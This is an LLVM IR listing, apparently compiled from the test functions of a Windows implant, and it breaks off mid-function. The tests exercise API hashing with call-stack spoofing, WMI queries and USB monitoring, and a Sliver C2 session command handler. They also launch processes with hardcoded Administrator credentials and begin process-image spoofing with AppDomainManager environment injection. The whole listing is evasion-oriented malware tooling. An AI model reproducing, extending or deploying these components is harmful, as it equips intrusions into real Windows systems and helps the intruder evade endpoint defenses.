; ModuleID = '.\build\main.ll'
  call void (ptr, ...) @LogError(ptr noundef @"??_C@_1FA@IIHENIHP@?$AA?$CF?$AAs?$AA?4?$AA?$CF?$AAd?$AA?3?$AA?5?$AA?$CF?$AAs?$AA?5?$AAf?$AAa?$AAi?$AAl?$AAe?$AAd?$AA?5?$AAa?$AAt?$AA?5?$AA?$CF?$AAs?$AA?5?$AA?$CI?$AAE?$AAr?$AAr?$AAo?$AAr?$AA?3?$AA?5?$AA0@", ptr noundef %12, i32 noundef 2837, ptr noundef @"??_C@_1BK@OPPELCCL@?$AAp?$AAO?$AAb?$AAj?$AAe?$AAc?$AAt?$AA?9?$AA?$DO?$AAG?$AAe?$AAt?$AA?$AA@", ptr noundef @"??_C@_1BI@HKCOGAHJ@?$AAC?$AAa?$AAl?$AAl?$AAb?$AAa?$AAc?$AAk?$AA1?$AA6?$AA1?$AA?$AA@", i32 noundef %10)
  br label %CLEANUP

if.end:                                           ; preds = %entry
  %13 = getelementptr inbounds %struct.tagVARIANT, ptr %DeviceID, i32 0, i32 0
  %vt = getelementptr inbounds %struct.anon.10, ptr %13, i32 0, i32 0
  %14 = load i16, ptr %vt, align 8
  %conv = zext i16 %14 to i32
  %cmp3 = icmp ne i32 %conv, 8
  br i1 %cmp3, label %if.then5, label %if.end6

if.then5:                                         ; preds = %if.end
  br label %CLEANUP

if.end6:                                          ; preds = %if.end
  %15 = getelementptr inbounds %struct.tagVARIANT, ptr %DeviceID, i32 0, i32 0
  %16 = getelementptr inbounds %struct.anon.10, ptr %15, i32 0, i32 4
  %17 = load ptr, ptr %16, align 8
  call void (ptr, ...) @PrintFormatW(ptr noundef @"??_C@_17MJEANDKP@?$AA?$CF?$AAs?$AA?6?$AA?$AA@", ptr noundef %17)
  br label %CLEANUP

CLEANUP:                                          ; preds = %if.end6, %if.then5, %if.then
  ret i32 0
}

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @test161() #0 {
entry:
  %call = call i32 @WmiExec(ptr noundef @"??_C@_1FK@HBAPANPO@?$AAS?$AAE?$AAL?$AAE?$AAC?$AAT?$AA?5?$AA?$CK?$AA?5?$AAF?$AAR?$AAO?$AAM?$AA?5?$AAW?$AAi?$AAn?$AA3?$AA2?$AA_?$AAD?$AAi?$AAs?$AAk?$AAD?$AAr?$AAi?$AAv?$AAe?$AAT?$AAo?$AAD@", ptr noundef @Callback161, ptr noundef null)
  ret void
}

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @test162() #0 {
entry:
  call void @MonitorUsb(ptr noundef null)
  ret void
}

declare dso_local void @MonitorUsb(ptr noundef) #1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @test163() #0 {
entry:
  %wszConfigPath = alloca [260 x i16], align 16
  %lpTemp = alloca ptr, align 8
  %pConfig = alloca ptr, align 8
  %pTempConfig = alloca ptr, align 8
  store ptr null, ptr %lpTemp, align 8
  store ptr null, ptr %pConfig, align 8
  store ptr null, ptr %pTempConfig, align 8
  %arraydecay = getelementptr inbounds [260 x i16], ptr %wszConfigPath, i64 0, i64 0
  %0 = call ptr @GetProcAddressH(i32 717748261, i32 -359873867)
  %1 = call ptr (ptr, ...) @SpoofCall(ptr %0, ptr null, ptr %arraydecay, i32 260)
  %2 = ptrtoint ptr %1 to i32
  %arraydecay1 = getelementptr inbounds [260 x i16], ptr %wszConfigPath, i64 0, i64 0
  %3 = call ptr @GetProcAddressH(i32 717748261, i32 913620588)
  %4 = call ptr (ptr, ...) @SpoofCall(ptr %3, ptr %arraydecay1)
  store ptr %4, ptr %lpTemp, align 8
  %5 = load ptr, ptr %lpTemp, align 8
  %arrayidx = getelementptr inbounds i16, ptr %5, i64 0
  store i16 0, ptr %arrayidx, align 2
  %arraydecay3 = getelementptr inbounds [260 x i16], ptr %wszConfigPath, i64 0, i64 0
  %6 = call ptr @GetProcAddressH(i32 245326953, i32 1381516009)
  %7 = call ptr (ptr, ...) @SpoofCall(ptr %6, ptr %arraydecay3, ptr @"??_C@_1BK@IHJIKEIL@?$AAl?$AAo?$AAg?$AAi?$AAt?$AAe?$AAc?$AAh?$AA?4?$AAc?$AAf?$AAg?$AA?$AA@")
  %arraydecay5 = getelementptr inbounds [260 x i16], ptr %wszConfigPath, i64 0, i64 0
  %call6 = call ptr @UnmarshalConfig(ptr noundef %arraydecay5)
  store ptr %call6, ptr %pConfig, align 8
  %call7 = call ptr @DuplicateStrW(ptr noundef @"??_C@_1EE@ELLOCCAB@?$AAC?$AA?3?$AA?2?$AAU?$AAs?$AAe?$AAr?$AAs?$AA?2?$AAA?$AAd?$AAm?$AAi?$AAn?$AA?2?$AAD?$AAe?$AAs?$AAk?$AAt?$AAo?$AAp?$AA?2?$AAc?$AAo?$AAn?$AAf?$AAi?$AAg?$AA?4?$AAc?$AAf@", i32 noundef 0)
  %8 = load ptr, ptr %pConfig, align 8
  %lpConfigPath = getelementptr inbounds %struct._GLOBAL_CONFIG, ptr %8, i32 0, i32 0
  store ptr %call7, ptr %lpConfigPath, align 4
  %9 = load ptr, ptr %pConfig, align 8
  call void @MarshalConfig(ptr noundef %9)
  %10 = load ptr, ptr %pConfig, align 8
  %lpConfigPath8 = getelementptr inbounds %struct._GLOBAL_CONFIG, ptr %10, i32 0, i32 0
  %11 = load ptr, ptr %lpConfigPath8, align 4
  %call9 = call ptr @UnmarshalConfig(ptr noundef %11)
  store ptr %call9, ptr %pTempConfig, align 8
  ret void
}

declare dso_local void @MarshalConfig(ptr noundef) #1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @test164() #0 {
entry:
  %lpTemp = alloca ptr, align 8
  %call = call ptr @Bit7zExtract(ptr noundef null, ptr noundef @"??_C@_1FA@GDPCDHJP@?$AAC?$AA?3?$AA?2?$AAU?$AAs?$AAe?$AAr?$AAs?$AA?2?$AAA?$AAd?$AAm?$AAi?$AAn?$AA?2?$AAD?$AAe?$AAs?$AAk?$AAt?$AAo?$AAp?$AA?2?$AAN?$AAe?$AAw?$AA?5?$AAf?$AAo?$AAl?$AAd?$AAe@", ptr noundef null)
  store ptr %call, ptr %lpTemp, align 8
  %0 = load ptr, ptr %lpTemp, align 8
  %cmp = icmp eq ptr %0, null
  br i1 %cmp, label %if.then, label %if.end

if.then:                                          ; preds = %entry
  call void (ptr, ...) @PrintFormatW(ptr noundef @"??_C@_1CO@OCOHPMFA@?$AAF?$AAa?$AAi?$AAl?$AAe?$AAd?$AA?5?$AAt?$AAo?$AA?5?$AAe?$AAx?$AAt?$AAr?$AAa?$AAc?$AAt?$AA?5?$AAf?$AAi?$AAl?$AAe?$AA?$AA@")
  br label %return

if.end:                                           ; preds = %entry
  %1 = load ptr, ptr %lpTemp, align 8
  call void (ptr, ...) @PrintFormatW(ptr noundef @"??_C@_17MJEANDKP@?$AA?$CF?$AAs?$AA?6?$AA?$AA@", ptr noundef %1)
  br label %return

return:                                           ; preds = %if.end, %if.then
  ret void
}

declare dso_local ptr @Bit7zExtract(ptr noundef, ptr noundef, ptr noundef) #1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @test165() #0 {
entry:
  %cnt.addr.i18 = alloca i64, align 8
  %ptr.addr.i19 = alloca ptr, align 8
  %vptr.i20 = alloca ptr, align 8
  %cnt.addr.i15 = alloca i64, align 8
  %ptr.addr.i16 = alloca ptr, align 8
  %vptr.i17 = alloca ptr, align 8
  %cnt.addr.i = alloca i64, align 8
  %ptr.addr.i = alloca ptr, align 8
  %vptr.i = alloca ptr, align 8
  %ReqElements = alloca [2 x ptr], align 16
  %pFinalElement = alloca ptr, align 8
  %szCommand = alloca [19 x i8], align 16
  %Envelope = alloca %struct._ENVELOPE, align 4
  %SliverSession = alloca %struct._SLIVER_SESSION_CLIENT, align 4
  store ptr null, ptr %pFinalElement, align 8
  call void @MemCopy(ptr align 16 %szCommand, ptr align 16 @__const.test165.szCommand, i64 19, i1 false)
  store i64 68, ptr %cnt.addr.i18, align 8
  store ptr %SliverSession, ptr %ptr.addr.i19, align 8
  %0 = load ptr, ptr %ptr.addr.i19, align 8
  store ptr %0, ptr %vptr.i20, align 8
  %1 = load ptr, ptr %vptr.i20, align 8
  %2 = ptrtoint ptr %1 to i64
  %3 = load i64, ptr %cnt.addr.i18, align 8
  call void @MemSet(ptr align 1 %1, i8 0, i64 %3, i1 true)
  %4 = load ptr, ptr %ptr.addr.i19, align 8
  store i64 16, ptr %cnt.addr.i15, align 8
  store ptr %ReqElements, ptr %ptr.addr.i16, align 8
  %5 = load ptr, ptr %ptr.addr.i16, align 8
  store ptr %5, ptr %vptr.i17, align 8
  %6 = load ptr, ptr %vptr.i17, align 8
  %7 = ptrtoint ptr %6 to i64
  %8 = load i64, ptr %cnt.addr.i15, align 8
  call void @MemSet(ptr align 1 %6, i8 0, i64 %8, i1 true)
  %9 = load ptr, ptr %ptr.addr.i16, align 8
  store i64 32, ptr %cnt.addr.i, align 8
  store ptr %Envelope, ptr %ptr.addr.i, align 8
  %10 = load ptr, ptr %ptr.addr.i, align 8
  store ptr %10, ptr %vptr.i, align 8
  %11 = load ptr, ptr %vptr.i, align 8
  %12 = ptrtoint ptr %11 to i64
  %13 = load i64, ptr %cnt.addr.i, align 8
  call void @MemSet(ptr align 1 %11, i8 0, i64 %13, i1 true)
  %14 = load ptr, ptr %ptr.addr.i, align 8
  %15 = call ptr @GetProcAddressH(i32 717748261, i32 -1441913739)
  %16 = call ptr (ptr, ...) @SpoofCall(ptr %15)
  %17 = call ptr @GetProcAddressH(i32 -2062442056, i32 -1934965594)
  %18 = call ptr (ptr, ...) @SpoofCall(ptr %17, ptr %16, i32 8, i64 812)
  %pGlobalConfig = getelementptr inbounds %struct._SLIVER_SESSION_CLIENT, ptr %SliverSession, i32 0, i32 0
  store ptr %18, ptr %pGlobalConfig, align 4
  %call5 = call ptr @DuplicateStrW(ptr noundef @"??_C@_1FA@IGHOIJJA@?$AAC?$AA?3?$AA?2?$AAU?$AAs?$AAe?$AAr?$AAs?$AA?2?$AAA?$AAd?$AAm?$AAi?$AAn?$AA?2?$AAA?$AAp?$AAp?$AAD?$AAa?$AAt?$AAa?$AA?2?$AAR?$AAo?$AAa?$AAm?$AAi?$AAn?$AAg?$AA?2?$AAL@", i32 noundef 0)
  %pGlobalConfig6 = getelementptr inbounds %struct._SLIVER_SESSION_CLIENT, ptr %SliverSession, i32 0, i32 0
  %19 = load ptr, ptr %pGlobalConfig6, align 4
  %lpSliverPath = getelementptr inbounds %struct._GLOBAL_CONFIG, ptr %19, i32 0, i32 22
  store ptr %call5, ptr %lpSliverPath, align 4
  %call7 = call ptr @DuplicateStrA(ptr noundef @"??_C@_01HIHLOKLC@1?$AA@", i32 noundef 0)
  %pGlobalConfig8 = getelementptr inbounds %struct._SLIVER_SESSION_CLIENT, ptr %SliverSession, i32 0, i32 0
  %20 = load ptr, ptr %pGlobalConfig8, align 4
  %lpPeerPrivKey = getelementptr inbounds %struct._GLOBAL_CONFIG, ptr %20, i32 0, i32 10
  store ptr %call7, ptr %lpPeerPrivKey, align 4
  %arraydecay = getelementptr inbounds [19 x i8], ptr %szCommand, i64 0, i64 0
  %21 = call ptr @GetProcAddressH(i32 717748261, i32 1398280933)
  %22 = call ptr (ptr, ...) @SpoofCall(ptr %21, ptr %arraydecay)
  %23 = ptrtoint ptr %22 to i32
  %arraydecay10 = getelementptr inbounds [19 x i8], ptr %szCommand, i64 0, i64 0
  %call11 = call ptr @CreateBytesElement(ptr noundef %arraydecay10, i32 noundef %23, i32 noundef 1)
  %arrayidx = getelementptr inbounds [2 x ptr], ptr %ReqElements, i64 0, i64 0
  store ptr %call11, ptr %arrayidx, align 16
  %call12 = call ptr @CreateStructElement(ptr noundef %ReqElements, i32 noundef 2, i32 noundef 0)
  store ptr %call12, ptr %pFinalElement, align 8
  %24 = load ptr, ptr %pFinalElement, align 8
  %cbMarshaledData = getelementptr inbounds %struct._PBElement, ptr %24, i32 0, i32 2
  %25 = load i32, ptr %cbMarshaledData, align 8
  %26 = load ptr, ptr %pFinalElement, align 8
  %pMarshaledData = getelementptr inbounds %struct._PBElement, ptr %26, i32 0, i32 1
  %27 = load ptr, ptr %pMarshaledData, align 8
  %call13 = call ptr @BufferMove(ptr noundef %27, i32 noundef %25)
  %pData = getelementptr inbounds %struct._ENVELOPE, ptr %Envelope, i32 0, i32 2
  store ptr %call13, ptr %pData, align 4
  %call14 = call ptr @CmdHandler(ptr noundef %Envelope, ptr noundef %SliverSession)
  ret void
}

declare dso_local ptr @BufferMove(ptr noundef, i32 noundef) #1

declare dso_local ptr @CmdHandler(ptr noundef, ptr noundef) #1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @test166() #0 {
entry:
  %cnt.addr.i5 = alloca i64, align 8
  %ptr.addr.i6 = alloca ptr, align 8
  %vptr.i7 = alloca ptr, align 8
  %cnt.addr.i = alloca i64, align 8
  %ptr.addr.i = alloca ptr, align 8
  %vptr.i = alloca ptr, align 8
  %si = alloca %struct._STARTUPINFOW, align 8
  %pi = alloca %struct._PROCESS_INFORMATION, align 8
  store i64 104, ptr %cnt.addr.i5, align 8
  store ptr %si, ptr %ptr.addr.i6, align 8
  %0 = load ptr, ptr %ptr.addr.i6, align 8
  store ptr %0, ptr %vptr.i7, align 8
  %1 = load ptr, ptr %vptr.i7, align 8
  %2 = ptrtoint ptr %1 to i64
  %3 = load i64, ptr %cnt.addr.i5, align 8
  call void @MemSet(ptr align 1 %1, i8 0, i64 %3, i1 true)
  %4 = load ptr, ptr %ptr.addr.i6, align 8
  store i64 24, ptr %cnt.addr.i, align 8
  store ptr %pi, ptr %ptr.addr.i, align 8
  %5 = load ptr, ptr %ptr.addr.i, align 8
  store ptr %5, ptr %vptr.i, align 8
  %6 = load ptr, ptr %vptr.i, align 8
  %7 = ptrtoint ptr %6 to i64
  %8 = load i64, ptr %cnt.addr.i, align 8
  call void @MemSet(ptr align 1 %6, i8 0, i64 %8, i1 true)
  %9 = load ptr, ptr %ptr.addr.i, align 8
  %cb = getelementptr inbounds %struct._STARTUPINFOW, ptr %si, i32 0, i32 0
  store i32 104, ptr %cb, align 8
  %10 = call ptr @GetProcAddressH(i32 717748261, i32 -2087873110)
  %11 = call ptr (ptr, ...) @SpoofCall(ptr %10, ptr @"??_C@_1EK@OLLCMIBA@?$AAC?$AA?3?$AA?2?$AAW?$AAi?$AAn?$AAd?$AAo?$AAw?$AAs?$AA?2?$AAS?$AAy?$AAs?$AAt?$AAe?$AAm?$AA3?$AA2?$AA?2?$AAo?$AAo?$AAb?$AAe?$AA?2?$AAo?$AAo?$AAb?$AAe?$AAl?$AAd?$AAr@", ptr null, ptr null, ptr null, i32 0, i32 0, ptr null, ptr @"??_C@_1DC@NHMCLEOL@?$AAC?$AA?3?$AA?2?$AAW?$AAi?$AAn?$AAd?$AAo?$AAw?$AAs?$AA?2?$AAS?$AAy?$AAs?$AAt?$AAe?$AAm?$AA3?$AA2?$AA?2?$AAo?$AAo?$AAb?$AAe?$AA?$AA@", ptr %si, ptr %pi)
  %12 = ptrtoint ptr %11 to i32
  %tobool = icmp ne i32 %12, 0
  br i1 %tobool, label %if.end, label %if.then

if.then:                                          ; preds = %entry
  %13 = call ptr @GetProcAddressH(i32 717748261, i32 816656067)
  %14 = call ptr (ptr, ...) @SpoofCall(ptr %13)
  %15 = ptrtoint ptr %14 to i32
  %16 = call ptr @GetProcAddressH(i32 717748261, i32 913620588)
  %17 = call ptr (ptr, ...) @SpoofCall(ptr %16, ptr @"??_C@_1BM@NAFJCHKH@?$AA?4?$AA?2?$AAT?$AAe?$AAs?$AAt?$AA?2?$AAm?$AAa?$AAi?$AAn?$AA?4?$AAc?$AA?$AA@")
  call void (ptr, ...) @LogError(ptr noundef @"??_C@_1FA@IIHENIHP@?$AA?$CF?$AAs?$AA?4?$AA?$CF?$AAd?$AA?3?$AA?5?$AA?$CF?$AAs?$AA?5?$AAf?$AAa?$AAi?$AAl?$AAe?$AAd?$AA?5?$AAa?$AAt?$AA?5?$AA?$CF?$AAs?$AA?5?$AA?$CI?$AAE?$AAr?$AAr?$AAo?$AAr?$AA?3?$AA?5?$AA0@", ptr noundef %17, i32 noundef 2911, ptr noundef @"??_C@_1BM@MMIOBBBF@?$AAC?$AAr?$AAe?$AAa?$AAt?$AAe?$AAP?$AAr?$AAo?$AAc?$AAe?$AAs?$AAs?$AA?$AA@", ptr noundef @"??_C@_1BA@PCBPMMLI@?$AAt?$AAe?$AAs?$AAt?$AA1?$AA6?$AA6?$AA?$AA@", i32 noundef %15)
  br label %if.end

if.end:                                           ; preds = %if.then, %entry
  %18 = call ptr @GetProcAddressH(i32 717748261, i32 424171848)
  %19 = call ptr (ptr, ...) @SpoofCall(ptr %18, i32 20000)
  ret void
}

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @test167() #0 {
entry:
  %0 = call ptr @GetProcAddressH(i32 1873003544, i32 -1951710286)
  %1 = call ptr (ptr, ...) @SpoofCall(ptr %0, ptr null, ptr @"??_C@_19BDAJEHDN@?$AAo?$AAp?$AAe?$AAn?$AA?$AA@", ptr @"??_C@_1GA@NDDEGBGM@?$AAC?$AA?3?$AA?2?$AAU?$AAs?$AAe?$AAr?$AAs?$AA?2?$AAA?$AAd?$AAm?$AAi?$AAn?$AA?2?$AAA?$AAp?$AAp?$AAD?$AAa?$AAt?$AAa?$AA?2?$AAR?$AAo?$AAa?$AAm?$AAi?$AAn?$AAg?$AA?2?$AAL@", ptr null, ptr @"??_C@_1FA@IGHOIJJA@?$AAC?$AA?3?$AA?2?$AAU?$AAs?$AAe?$AAr?$AAs?$AA?2?$AAA?$AAd?$AAm?$AAi?$AAn?$AA?2?$AAA?$AAp?$AAp?$AAD?$AAa?$AAt?$AAa?$AA?2?$AAR?$AAo?$AAa?$AAm?$AAi?$AAn?$AAg?$AA?2?$AAL@", i32 0)
  %2 = call ptr @GetProcAddressH(i32 717748261, i32 424171848)
  %3 = call ptr (ptr, ...) @SpoofCall(ptr %2, i32 -727379968)
  ret void
}

declare dllimport ptr @ShellExecuteW(ptr noundef, ptr noundef, ptr noundef, ptr noundef, ptr noundef, i32 noundef) #1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @test168() #0 {
entry:
  %Info = alloca ptr, align 8
  store ptr null, ptr %Info, align 8
  %call = call ptr @Bit7zGetInfo(ptr noundef @"??_C@_1HA@NBLHGEHK@?$AAC?$AA?3?$AA?2?$AAU?$AAs?$AAe?$AAr?$AAs?$AA?2?$AAA?$AAd?$AAm?$AAi?$AAn?$AA?2?$AAA?$AAp?$AAp?$AAD?$AAa?$AAt?$AAa?$AA?2?$AAR?$AAo?$AAa?$AAm?$AAi?$AAn?$AAg?$AA?2?$AAL@", ptr noundef @"??_C@_1FO@LFIIELME@?$AAC?$AA?3?$AA?2?$AAU?$AAs?$AAe?$AAr?$AAs?$AA?2?$AAA?$AAd?$AAm?$AAi?$AAn?$AA?2?$AAA?$AAp?$AAp?$AAD?$AAa?$AAt?$AAa?$AA?2?$AAL?$AAo?$AAc?$AAa?$AAl?$AA?2?$AAT?$AAe?$AAm@")
  store ptr %call, ptr %Info, align 8
  ret void
}

declare dso_local ptr @Bit7zGetInfo(ptr noundef, ptr noundef) #1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @test169() #0 {
entry:
  %cnt.addr.i5 = alloca i64, align 8
  %ptr.addr.i6 = alloca ptr, align 8
  %vptr.i7 = alloca ptr, align 8
  %cnt.addr.i = alloca i64, align 8
  %ptr.addr.i = alloca ptr, align 8
  %vptr.i = alloca ptr, align 8
  %StartupInfo = alloca %struct._STARTUPINFOW, align 8
  %ProcInfo = alloca %struct._PROCESS_INFORMATION, align 8
  store i64 104, ptr %cnt.addr.i5, align 8
  store ptr %StartupInfo, ptr %ptr.addr.i6, align 8
  %0 = load ptr, ptr %ptr.addr.i6, align 8
  store ptr %0, ptr %vptr.i7, align 8
  %1 = load ptr, ptr %vptr.i7, align 8
  %2 = ptrtoint ptr %1 to i64
  %3 = load i64, ptr %cnt.addr.i5, align 8
  call void @MemSet(ptr align 1 %1, i8 0, i64 %3, i1 true)
  %4 = load ptr, ptr %ptr.addr.i6, align 8
  store i64 24, ptr %cnt.addr.i, align 8
  store ptr %ProcInfo, ptr %ptr.addr.i, align 8
  %5 = load ptr, ptr %ptr.addr.i, align 8
  store ptr %5, ptr %vptr.i, align 8
  %6 = load ptr, ptr %vptr.i, align 8
  %7 = ptrtoint ptr %6 to i64
  %8 = load i64, ptr %cnt.addr.i, align 8
  call void @MemSet(ptr align 1 %6, i8 0, i64 %8, i1 true)
  %9 = load ptr, ptr %ptr.addr.i, align 8
  %cb = getelementptr inbounds %struct._STARTUPINFOW, ptr %StartupInfo, i32 0, i32 0
  store i32 104, ptr %cb, align 8
  %10 = call ptr @GetProcAddressH(i32 -308247428, i32 -951742439)
  %11 = call ptr (ptr, ...) @SpoofCall(ptr %10, ptr @"??_C@_1BM@LGMDCJGP@?$AAA?$AAd?$AAm?$AAi?$AAn?$AAi?$AAs?$AAt?$AAr?$AAa?$AAt?$AAo?$AAr?$AA?$AA@", ptr null, ptr @"??_C@_1BG@IDMACKDP@?$AAC?$AAa?$AAy?$AAd?$AAa?$AAb?$AAo?$AAd?$AAe?$AA1?$AA?$AA@", i32 0, ptr @"??_C@_1EA@JPPBIOPI@?$AAC?$AA?3?$AA?2?$AAW?$AAi?$AAn?$AAd?$AAo?$AAw?$AAs?$AA?2?$AAS?$AAy?$AAs?$AAt?$AAe?$AAm?$AA3?$AA2?$AA?2?$AAn?$AAo?$AAt?$AAe?$AAp?$AAa?$AAd?$AA?4?$AAe?$AAx?$AAe?$AA?$AA@", ptr @"??_C@_1HK@IMOBAGMH@?$AAC?$AA?3?$AA?2?$AAW?$AAi?$AAn?$AAd?$AAo?$AAw?$AAs?$AA?2?$AAS?$AAy?$AAs?$AAt?$AAe?$AAm?$AA3?$AA2?$AA?2?$AAn?$AAo?$AAt?$AAe?$AAp?$AAa?$AAd?$AA?4?$AAe?$AAx?$AAe?$AA?5@", i32 0, ptr null, ptr null, ptr %StartupInfo, ptr %ProcInfo)
  %12 = ptrtoint ptr %11 to i32
  %tobool = icmp ne i32 %12, 0
  br i1 %tobool, label %if.end, label %if.then

if.then:                                          ; preds = %entry
  %13 = call ptr @GetProcAddressH(i32 717748261, i32 816656067)
  %14 = call ptr (ptr, ...) @SpoofCall(ptr %13)
  %15 = ptrtoint ptr %14 to i32
  %16 = call ptr @GetProcAddressH(i32 717748261, i32 913620588)
  %17 = call ptr (ptr, ...) @SpoofCall(ptr %16, ptr @"??_C@_1BM@NAFJCHKH@?$AA?4?$AA?2?$AAT?$AAe?$AAs?$AAt?$AA?2?$AAm?$AAa?$AAi?$AAn?$AA?4?$AAc?$AA?$AA@")
  call void (ptr, ...) @LogError(ptr noundef @"??_C@_1FA@IIHENIHP@?$AA?$CF?$AAs?$AA?4?$AA?$CF?$AAd?$AA?3?$AA?5?$AA?$CF?$AAs?$AA?5?$AAf?$AAa?$AAi?$AAl?$AAe?$AAd?$AA?5?$AAa?$AAt?$AA?5?$AA?$CF?$AAs?$AA?5?$AA?$CI?$AAE?$AAr?$AAr?$AAo?$AAr?$AA?3?$AA?5?$AA0@", ptr noundef %17, i32 noundef 2940, ptr noundef @"??_C@_1DA@PMGMIIAO@?$AAC?$AAr?$AAe?$AAa?$AAt?$AAe?$AAP?$AAr?$AAo?$AAc?$AAe?$AAs?$AAs?$AAW?$AAi?$AAt?$AAh?$AAL?$AAo?$AAg?$AAo?$AAn?$AAW?$AA?$AA@", ptr noundef @"??_C@_1BA@KKHMNMOO@?$AAt?$AAe?$AAs?$AAt?$AA1?$AA6?$AA9?$AA?$AA@", i32 noundef %15)
  br label %return

if.end:                                           ; preds = %entry
  call void (ptr, ...) @PrintFormatW(ptr noundef @"??_C@_1BE@GLAHMBKE@?$AAS?$AAu?$AAc?$AAc?$AAe?$AAs?$AAs?$AA?$CB?$AA?6?$AA?$AA@")
  br label %return

return:                                           ; preds = %if.end, %if.then
  ret void
}

declare dllimport i32 @CreateProcessWithLogonW(ptr noundef, ptr noundef, ptr noundef, i32 noundef, ptr noundef, ptr noundef, i32 noundef, ptr noundef, ptr noundef, ptr noundef, ptr noundef) #1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @test170() #0 {
entry:
  %call = call ptr @GetProcAddressH(i32 noundef 717748261, i32 noundef -1150661063)
  ret void
}

declare dso_local ptr @GetProcAddressH(i32 noundef, i32 noundef) #1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @test171() #0 {
entry:
  %cnt.addr.i = alloca i64, align 8
  %ptr.addr.i = alloca ptr, align 8
  %vptr.i = alloca ptr, align 8
  %pProcessParameters = alloca ptr, align 8
  %ProcInfo = alloca %struct._RTL_USER_PROCESS_INFORMATION, align 8
  %Status = alloca i32, align 4
  %SpoofedImagePathName = alloca %struct._UNICODE_STRING, align 8
  %CurrentDirectory = alloca %struct._UNICODE_STRING, align 8
  %CommandLine = alloca %struct._UNICODE_STRING, align 8
  %ImagePathName = alloca %struct._UNICODE_STRING, align 8
  %EnvironmentBlock = alloca ptr, align 8
  %lpTemp = alloca ptr, align 8
  %NewEnvironmentBlock = alloca ptr, align 8
  %cchEnvironmentBlock = alloca i32, align 4
  %wszAppDomainManagerEnv = alloca [165 x i16], align 16
  store ptr null, ptr %pProcessParameters, align 8
  store i32 0, ptr %Status, align 4
  store ptr null, ptr %EnvironmentBlock, align 8
  store ptr null, ptr %lpTemp, align 8
  store ptr null, ptr %NewEnvironmentBlock, align 8
  store i32 0, ptr %cchEnvironmentBlock, align 4
  call void @MemCopy(ptr align 16 %wszAppDomainManagerEnv, ptr align 16 @__const.test171.wszAppDomainManagerEnv, i64 330, i1 false)
  store i64 104, ptr %cnt.addr.i, align 8
  store ptr %ProcInfo, ptr %ptr.addr.i, align 8
  %0 = load ptr, ptr %ptr.addr.i, align 8
  store ptr %0, ptr %vptr.i, align 8
  %1 = load ptr, ptr %vptr.i, align 8
  %2 = ptrtoint ptr %1 to i64
  %3 = load i64, ptr %cnt.addr.i, align 8
  call void @MemSet(ptr align 1 %1, i8 0, i64 %3, i1 true)
  %4 = load ptr, ptr %ptr.addr.i, align 8
  call void @InitUnicodeString(ptr noundef %SpoofedImagePathName, ptr noundef @"??_C@_1HE@GOCACKJC@?$AA?2?$AA?$DP?$AA?$DP?$AA?2?$AAD?$AA?3?$AA?2?$AAT?$AAe?$AAm?$AAp?$AA?2?$AAD?$AAi?$AAr?$AAt?$AAy?$AAC?$AAL?$AAR?$AA?2?$AAD?$AAi?$AAr?$AAt?$AAy?$AAC?$AAL?$AAR?$AA?2?$AAb?$AAi@")
  call void @InitUnicodeString(ptr noundef %CurrentDirectory, ptr noundef @"??_C@_1CK@NKEBECBJ@?$AAC?$AA?3?$AA?2?$AAW?$AAi?$AAn?$AAd?$AAo?$AAw?$AAs?$AA?2?$AAS?$AAy?$AAs?$AAt?$AAe?$AAm?$AA3?$AA2?$AA?2?$AA?$AA@")
  call void @InitUnicodeString(ptr noundef %CommandLine, ptr noundef @"??_C@_1FA@DOJBHIOM@?$AA?$CC?$AAC?$AA?3?$AA?2?$AAW?$AAi?$AAn?$AAd?$AAo?$AAw?$AAs?$AA?2?$AAS?$AAy?$AAs?$AAt?$AAe?$AAm?$AA3?$AA2?$AA?2?$AAU?$AAe?$AAv?$AAA?$AAp?$AAp?$AAM?$AAo?$AAn?$AAi?$AAt@")
